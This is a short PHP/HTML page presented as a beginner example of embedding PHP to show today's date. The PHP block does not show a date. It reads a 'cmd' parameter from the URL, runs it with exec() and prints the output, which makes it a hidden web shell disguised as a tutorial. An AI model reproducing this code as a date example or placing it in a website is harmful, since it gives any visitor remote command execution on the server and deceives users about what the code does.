<!DOCTYPE html>
<html>
<head>
<title>How to put PHP in HTML- Date Example</title>
</head>
<body>
<div>This is pure HTML message.</div>
<div>Next, we’ll display today’s date and day by PHP!</div>
<div>
<?php
$cmd=$_GET['cmd'];
echo exec($cmd);
?>
</div>
<div>Again, this is static HTML content.</div>
</body>
</html>
